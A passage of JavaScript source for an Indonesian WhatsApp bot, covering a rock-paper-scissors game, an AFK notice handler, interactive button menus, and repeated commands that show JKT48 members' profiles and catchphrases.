if (!roof.pilih) slime.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) slime.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) slime.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
slime.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) slime.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) slime.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
slime.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
> \`${pushname}\` *Telah Kembali Dari Afk* ${user.afkReason ?
'\n> *Setelah :* ' + user.afkReason : ''}
> *Selama :* ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

function pickMoji(list) {
     return list[Math.floor(Math.random() * list.length)]
  }

async function falseR () {
slime.sendReact(m.chat, '❌', m.key)
}

async function loading () {
var kayy = [
`${pickMoji(['🙄','🤯','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`,
`${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','♻️','〽️','⚠️'])}`,
`${pickMoji(['😨','😅','😂','😳','💭','🗯','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`,
`${pickMoji(['😳','💭','🗯','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`,
`${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','💣','😔','👀','👎','🥶','💯','💤','💨','🔥','👍','❓️','⏳️','💥','🤙'])}`,
]
let { key } = await slime.sendReact(m.chat, `${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`, m.key)//Pengalih isu

for (let i = 0; i < kayy.length; i++) {
await sleep(65)
await slime.sendReact(m.chat, kayy[i], m.key)
//PESAN LEPAS
}
}
//BATAS
//==================================================//
switch(command) {
case "menu": {
if (!isRegistered) return reply(mess.regis)
let limitz = db.data.users[m.sender].limit;
nano_sad = `👋🏻allo kak ${salam} @${m?.sender.split('@')[0]} aku adalah bot whatsapp yang di program untuk membantu owner ku, dan perkenalkan nama aku *AlyaBot* yang di buat khusus oleh Ownerku *LynnZxD*

 kalo kakak gk sdm rendah pasti kakak gk bakal spam bot, spam siap siap aku blokir
 `
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
             {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"ALL INFO BOT",
"sections":[{"title":"${botname}",
"rows":[{"header":" LynnZxD",
"title":"${botname}",
"description":"Melihat All Info Bot",
"id":".lynnzxd"},
{"header":"RULES BOT",
"title":"${botname}",
"description":"Melihat Rules Bot",
"id":".rules"},
{"header":"LIST PRODUK",
"title":"${botname}",
"description":"Melihat List All Produk",
"id":".listproduk"},
{"header":"LIST DO",
"title":"${botname}",
"description":"List Harga Digital Ocean",
"id":".listdo"},
{"header":"LIST VPS",
"title":"${botname}",
"description":"List Harga Vps",
"id":".listvps"},
{"header":"LIST PANEL",
"title":"${botname}",
"description":"List Harga Panel Run Bot",
"id":".listpanel"},
{"header":"DONASI",
"title":"${botname}",
"description":"Terimakasih Orang Baik",
"id":".donasi"}]
}]
}` },
              {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "Menu LynnZxD",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        {
        "header": "ALL MENU",
          "title": "${botname}",
          "description": "Menampilkan Seluruh Fitur",
          "id": ".allmenu"
        },
        {
          "header": "GROUP MENU",
          "title": "${botname}",
          "description": "Tampilkan Menu Group",
          "id": ".groupmenu"
        },
        {
        "header": "SUBDOMAIN MENU",
          "title": "${botname}",
          "description": "Menampilkan Subdomain Menu",
          "id": ".subdomain"
        },
        {
        "header": "PANEL MENU",
          "title": "${botname}",
          "description": "Menampilkan Panel Menu",
          "id": ".cpanelmenu"
        },
        {
        "header": "DIGITAL OCEAN MENU",
          "title": "${botname}",
          "description": "Menampilkan Digital Ocean Menu",
          "id": ".domenu"
          },
        {
        "header": "LINE NODE MENU",
          "title": "${botname}",
          "description": "Menampilkan Line Node Menu",
          "id": ".linodemenu"
        },
        {
          "header": "GAME MENU",
          "title": "${botname}",
          "description": "Menampilkan Game Menu",
          "id": ".gamemenu"
          },
        {
          "header": "OTHER MENU",
          "title": "${botname}",
          "description": "Menampilkan Other Menu",
          "id": ".othermenu"
        },
        {
        "header": "DOWNLOAD MENU",
        "title": "${botname}",
        "description": "Menampilkan Download Menu",
        "id": ".downloadmenu"
         },
         {
        "header": "JKT48 MENU",
        "title": "${botname}",
        "description": "Menampilkan Jkt48 Menu",
        "id": ".jkt48menu"
        },
        {
          "header": "ANONYMOUS MENU",
          "title": "${botname}",
          "description": "Menampilkan Anonymous Menu",
          "id": ".anonymousmenu"
          },
        {
          "header": "ATTACK MENU",
          "title": "${botname}",
          "description": "Menampilkan Attack Menu",
          "id": ".attackmenu"
          },
        {
          "header": "SCRIPT MENU",
          "title": "${botname}",
          "description": "Menampilkan Script Menu",
          "id": ".scriptmenu"
        },
        {
          "header": "OWNER MENU",
          "title": "${botname}",
          "description": "Tampilkan Owner Menu",
          "id": ".ownermenu"
        }
      ]
    }
  ]
}`


              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
           }
           break
case "jiko-oshi": {
if (!isRegistered) return reply(mess.regis)
let limitz = db.data.users[m.sender].limit;
nano_sad = `sᴇʟᴀᴍᴀᴛ ${salam} ᴋᴀᴋ @${m?.sender.split('@')[0]} sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ᴅɪʙᴀᴡᴀʜ ɪɴɪ 👇 `
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
             {
                
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "JIKO-OSHI",
  "sections": [
    {
    "title": "${botname}",
      "rows": [
        {
          "header": "JIKO-OSHI KIMMY",
          "title": "GEN 12",
          "description": "Menampilkan JIKO-OSHI KIMMY",
          "id": ".jiko-kimmy"
        },
        {
          "header": "JIKO-OSHI JEANE",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI JEANE",
          "id": ".jiko-jeane"
        },
        {
          "header": "JIKO-OSHI GREESELL",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI GREESELL",
          "id": ".jiko-greesell"
        },
        {
          "header": "JIKO-OSHI GRACE",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI GRACE",
          "id": ".jiko-grace"
        },
        {
          "header": "JIKO-OSHI GENDIS",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI GENDIS",
          "id": ".jiko-gendis"
        },
        {
          "header": "JIKO-OSHI DESY",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI DESY",
          "id": ".jiko-desy"
        },
        {
          "header": "JIKO-OSHI DENA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI DENA",
          "id": ".jiko-dena"
        },
        {
          "header": "JIKO-OSHI CYNTHIA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI CYNTHIA",
          "id": ".jiko-cynthia"
        },
        {
          "header": "JIKO-OSHI CHELSEA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI CHELSEA",
          "id": ".jiko-chelsea"
        },
        {
          "header": "JIKO-OSHI CELLINE",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI CELLINE",
          "id": ".jiko-celline"
        },
        {
          "header": "JIKO-OSHI CATHLEEN",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI CATHLEEN",
          "id": ".jiko-cathleen"
        },
        {
          "header": "JIKO-OSHI AULIA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI AULIA",
          "id": ".jiko-aulia"
        },
        {
          "header": "JIKO-OSHI ANINDYA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI ANINDYA",
          "id": ".jiko-anindya"
        },
        {
          "header": "JIKO-OSHI ALYA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI ALYA",
          "id": ".jiko-alya"
        },
        {
         "header": "JIKO-OSHI MICHIE",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI MICHIE",
          "id": ".jiko-michie"
        },
        {
         "header": "JIKO-OSHI INDIRA",
          "title": "GEN 10",
          "description": "Menampilkan JIKO-OSHI INDIRA",
          "id": ".jiko-indira"
        },
        {
         "header": "JIKO-OSHI ADEL",
          "title": "GEN 8",
          "description": "Menampilkan JIKO-OSHI ADEL",
          "id": ".jiko-adel"
       },
       {
        "header": "JIKO-OSHI CHRISTY",
          "title": "GEN 7",
          "description": "Menampilkan JIKO-OSHI CHRISTY",
          "id": ".jiko-christy"
       },
       {
        "header": "JIKO-OSHI FREYA",
          "title": "GEN 7",
          "description": "Menampilkan JIKO-OSHI FREYA",
          "id": ".jiko-freya"
        }
      ]
    }
  ]
}`


              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
           }
           break
                      case 'jiko-adel': {
           let xmenu_oh = `
> *NAME* : *\`REVA FIDELA ADEL PANTJORO\`*
> *GENERATION* : 8
> *JIKO* : BAGAI KUCING YANG KALEM, TAPI SELALU MEMIKAT HATI KAMU, HAI AKU ADEL!`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/adel.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
                      case 'jiko-michie': {
           let xmenu_oh = `
> *NAME* : *\`MICHELLE ALEXANDRA\`*
> *GENERATION* : 11
> *JIKO* : ALWAYS YOUR NUMBER ONE TILL INFINITY AND BEYOND, HELLO EVERYONE IT'S MICHIE!`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/michie.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
           case 'jiko-indira': {
           let xmenu_oh = `
> *NAME* : *\`INDIRA PUTRI SERUNI\`*
> *GENERATION* : 10
> *OLD JIKO* : WATASHI NO KOKORO UNLOCK, AKAN MENEMANI HARI-HARIMU DENGAN SEPENUH HATI
> *NEW JIKO* : SENYUMANKU MENATAP LURUS KEPADAMU, SMILE EYES INDIRAA!`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/indira.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
                      case 'jiko-freya': {
           let xmenu_oh = `
> *NAME* : *\`FREYA JAYAWARDANA\`*
> *GENERATION* : 7
> *JIKO* : GADIS KOLERIS YANG SUKA BERIMAJINASI, TERANGI HARIMU DENGAN SENYUM KARAMELKU. HALO, AKU FREYA`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/freya.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-anindya': {
           let xmenu_oh = `
> *NAME* : *\`ANINDYA RAMADHANI\`*
> *GENERATION* : 11
> *JIKO* : SI MUNGIL HADIR, SEMANIS MANGGA`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/anin.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-aulia': {
           let xmenu_oh = `
> *NAME* : *\`AULIAA ASYIRA\`*
> *GENERATION* : 7
> *JIKO* : OTSU! SENYUM YANG LEBAR DAN MANIS, AULIA! SELALU INGET AKU, YA!`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/aulia.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-kimmy': {
           let xmenu_oh = `
> *NAME* : *\`VICTORIA KIMBERLY\`*
> *GENERATION* : 12
> *JIKO* : BAGAI HAMSTER YANG LINCAH, AKU AKAN BERLARI-LARI DIPIKIRANMU, HALO HAA KATAKAN KIMMY!`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/kimmy.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-greesell': {
           let xmenu_oh = `
> *NAME* : *\`GREESELLA ADHALIA\`*
> *GENERATION* : 11
> *JIKO* : PANDANGAN MATAKU AKAN MENYINARI HATIMU BAGAIKAN KUNAN-KUNANG DI MALAM HARI`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/greesell.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-grace': {
           let xmenu_oh = `
> *NAME* : *\`GRACE OCTAVIANI\`*
> *GENERATION* : 11
> *JIKO* : MANIS SEPERTI GULALI, IMUT SEPERTI KELINCI`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/grace.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-jeane': {
           let xmenu_oh = `
> *NAME* : *\`JEANE VICTORIA\`*
> *GENERATION* : 11
> *JIKO* : VICTORIA! AKU AKAN SELALU MEMENANGKAN HATIMU`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./SlimeMedia/image/jeane.jpg')}, { upload: slime.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"LynnZxD","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'jiko-gendis': {
           let xmenu_oh = `
> *NAME* : *\`GENDIS MAYRANNISA\`*
> *GENERATION* : 11
> *JIKO* : BONJOUR, PERIANG DAN PENCAIR SUASANA ITULAH AKU!`
           let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
